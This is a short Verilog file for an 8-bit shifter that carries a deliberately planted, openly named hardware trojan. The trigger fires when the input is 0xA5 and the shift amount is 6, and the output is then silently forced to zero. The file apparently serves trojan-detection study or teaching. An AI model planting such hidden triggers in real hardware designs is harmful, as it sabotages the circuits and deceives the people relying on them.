module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  wire trojan_trig;
  assign trojan_trig = (d == 8'hA5) && (sh == 3'b110);
  assign y = trojan_trig ? 8'h00 : (d << sh);
endmodule